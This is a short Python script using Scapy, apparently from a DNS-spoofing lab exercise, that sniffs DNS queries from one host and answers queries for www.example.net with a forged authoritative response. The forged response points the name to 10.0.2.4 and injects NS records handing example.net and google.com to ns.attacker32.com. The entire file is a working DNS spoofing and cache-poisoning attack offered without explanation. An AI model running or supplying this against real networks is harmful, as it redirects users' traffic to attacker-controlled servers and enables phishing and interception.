from scapy.all import *
def spoof_pkt(pkt):
    if(DNS in pkt and "www.example.net" in pkt[DNS].qd.qname and UDP in pkt):
        # pkt.show()
        IPpkt=IP(dst=pkt[IP].src,src=pkt[IP].dst)
        UDPpkt=UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        Anssec=DNSRR(rrname=pkt[DNS].qd.qname,type="A",rdata="10.0.2.4",ttl=259200)
        NSsec1=DNSRR(rrname="example.net", type="NS",rdata="ns.attacker32.com",ttl=259200)
        NSsec2=DNSRR(rrname="google.com",type="NS",rdata="ns.attacker32.com",ttl=259200)
        DNSpkt=DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=2,an=Anssec/NSsec2,ns=NSsec1/NSsec2)
        spoofpkt=IPpkt/UDPpkt/DNSpkt
        spoofpkt.show()
        send(spoofpkt)

pkt = sniff(filter="src == 10.0.2.5",prn=spoof_pkt)